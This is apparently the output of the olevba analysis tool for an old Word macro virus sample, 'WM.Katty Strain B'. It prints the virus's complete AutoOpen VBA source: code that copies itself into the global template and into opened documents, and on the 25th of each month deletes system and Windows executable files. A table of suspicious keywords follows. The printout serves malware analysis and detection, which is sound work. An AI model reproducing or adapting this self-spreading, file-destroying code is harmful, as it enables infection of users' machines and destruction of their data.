olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Katty-c7cd643b7c094128aaa87dc3a251432aa758031e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Katty-c7cd643b7c094128aaa87dc3a251432aa758031e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Katty-c7cd643b7c094128aaa87dc3a251432aa758031e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Title$
Dim Author$
Dim DateCr$
Dim MacrosFullName$
Dim FileFullName$
Dim PathFullName$

    Title$ = "WM.Katty Strain B"
    Author$ = "Maverick"
    DateCr$ = "November, 1998"

    MacrosFullName$ = "AutoOpen"
    FileFullName$ = WordBasic.[FileName$]()
    PathFullName$ = WordBasic.[DefaultDir$](2) + "\normal.dot"

    Dim a As Object: Set a = WordBasic.DialogRecord.Organizer(False)
    a.Копировать = 1
    a.Tab = 3
    a.Name = MacrosFullName$
    a.Source = FileFullName$
    a.Destination = PathFullName$

    On Error Resume Next
    WordBasic.Organizer a
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    If WordBasic.CountMacros(1) = 0 Then
        a.Source = PathFullName$
        a.Destination = FileFullName$
        WordBasic.Organizer a
        WordBasic.FileSaveAs Format:=1
    End If

    If WordBasic.Day(WordBasic.Now()) = 11 And WordBasic.Month(WordBasic.Now()) = 5 Then
        WordBasic.MsgBox "Happy Birthday My Dear Katty!"
        WordBasic.MsgBox "         I Love You!"
        Else
    End If

    If WordBasic.Day(WordBasic.Now()) = 3 And WordBasic.Month(WordBasic.Now()) = 8 Then
        WordBasic.MsgBox "Today Is My Birthday!"
        WordBasic.MsgBox "Happy Birthday Maverick!"
        Else
    End If

    If WordBasic.Day(WordBasic.Now()) = 25 Then
        WordBasic.Kill "C:\*.bat"
        WordBasic.Kill "C:\*.sys"
        WordBasic.Kill "C:\windows\*.dll"
        WordBasic.Kill "C:\windows\*.exe"
        WordBasic.Kill "C:\windows\command\*.com"
        WordBasic.Kill "C:\windows\command\*.exe"
        WordBasic.Kill "C:\windows\command\*.vxd"
        WordBasic.MsgBox "Ha-Ha!!!"
        Else
    End If


End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

